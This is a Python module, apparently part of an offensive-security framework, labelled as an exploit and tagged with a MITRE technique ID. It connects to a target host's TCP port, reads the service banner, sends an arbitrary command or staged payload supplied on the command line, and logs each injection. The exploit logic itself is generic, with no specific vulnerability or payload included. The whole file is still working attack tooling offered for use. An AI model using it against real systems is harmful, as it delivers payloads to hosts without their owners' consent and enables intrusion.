# modules/exploits/tcp_banner_stager.py

import socket
import argparse
import json
import os
from datetime import datetime

MITRE_TTP = "T1203"  # Exploitation for Client Execution
LOG_FILE = "results/exploit_logs.json"

def log_injection(target, port, payload):
    os.makedirs("results", exist_ok=True)
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target": target,
        "port": port,
        "payload": payload,
        "ttp": MITRE_TTP
    }
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(log_entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def inject_banner(target, port, payload):
    print(f"[+] Connecting to {target}:{port}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target, port))
            banner = s.recv(1024)
            print(f"[✓] Banner: {banner.decode(errors='ignore').strip()}")
            s.sendall(payload.encode() + b'\n')
            print(f"[✓] Payload sent.")
            log_injection(target, port, payload)
    except Exception as e:
        print(f"[!] Failed to connect or send: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TCP Banner Payload Injector")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, required=True, help="Target port (e.g. 21, 23)")
    parser.add_argument("--payload", required=True, help="Command or staged payload to send")
    args = parser.parse_args()

    inject_banner(args.ip, args.port, args.payload)
